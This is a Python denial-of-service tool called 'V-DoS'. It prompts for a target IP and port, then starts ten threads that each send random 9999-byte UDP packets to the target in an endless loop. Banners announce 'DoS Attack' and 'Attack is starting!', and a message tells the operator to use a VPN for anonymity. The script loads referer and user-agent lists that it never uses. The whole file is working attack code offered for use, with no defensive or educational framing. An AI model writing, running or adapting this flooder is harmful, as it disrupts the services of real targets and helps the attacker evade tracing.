import os
import random
import socket
import threading
import logging
from datetime import datetime
import re
from cryptography.fernet import Fernet
import time

# Logging setup
logging.basicConfig(level=logging.INFO, format='%(message)s')

# Color definitions
RED = "\033[91m"
CYAN = "\033[96m"
YELLOW = "\033[93m"
GREEN = "\033[92m"
RESET = "\033[0m"  # Reset color

def load_referers(filename):
    with open(filename, 'r') as f:
        referers = [line.strip() for line in f if line.strip()]
    return referers

def load_useragents(filename):
    with open(filename, 'r') as f:
        useragents = [line.strip() for line in f if line.strip()]
    return useragents

def generate_key():
    """Generates a new Fernet encryption key."""
    return Fernet.generate_key()

def encrypt_data(data, key):
    """Encrypts data using the provided key."""
    f = Fernet(key)
    return f.encrypt(data)

def is_valid_ip(ip):
    """Validates the given IP address."""
    pattern = r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$"
    return re.match(pattern, ip) is not None

def is_valid_port(port):
    """Validates the given port number."""
    return 1 <= port <= 65535

def send_packets(ip, port, referers, useragents):
    """Function to send packets continuously without proxies."""
    sent = 0
    key = generate_key()  # Generate a new encryption key for each thread

    while True:
        try:
            # Create a new UDP socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            # Generate random bytes to send (9999 bytes)
            bytes = random._urandom(9999)

            # Encrypt the packet data
            encrypted_data = encrypt_data(bytes, key)

            # Sending the encrypted packet
            sock.sendto(encrypted_data, (ip, port))
            sent += 1
            logging.info(f"{CYAN}Sent {sent} packet to {ip}{RESET}")

        except (socket.error, Exception) as e:
            logging.error(f"{RED}Error sending packet - {e}{RESET}")

        # Fixed delay of 0.1 seconds
        time.sleep(0.1)

# Clear the screen and display the banner
os.system("clear")
os.system("figlet V-DoS")

# Reminder to use VPN
logging.info(f"{RED}Reminder: Use VPN for more Anonymity.{RESET}")

# Input for Target IP and Port
print(f"{RED}Target IP{RESET}")
ip = input("> ")
print(f"{RED}Port{RESET}")
port = input("> ")

# Validate IP and Port
if not is_valid_ip(ip) or not is_valid_port(int(port)):
    logging.error(f"{RED}Invalid IP or port{RESET}")
    exit(1)

# Clear the screen and display the attack banner
os.system("clear")
print(f"{CYAN}")
os.system("figlet DoS Attack")
print(f"{YELLOW}Attack is starting!{RESET}")

# Load referers and user agents from their respective files
referers = load_referers('referers.txt')
useragents = load_useragents('useragents.txt')

# Start multiple threads to send packets to the target IP and port
thread_count = 10  # Number of threads to run

try:
    for _ in range(thread_count):
        thread = threading.Thread(target=send_packets, args=(ip, int(port), referers, useragents))
        thread.start()
except KeyboardInterrupt:
    logging.info(f"{GREEN}Attack stopped by user.{RESET}")
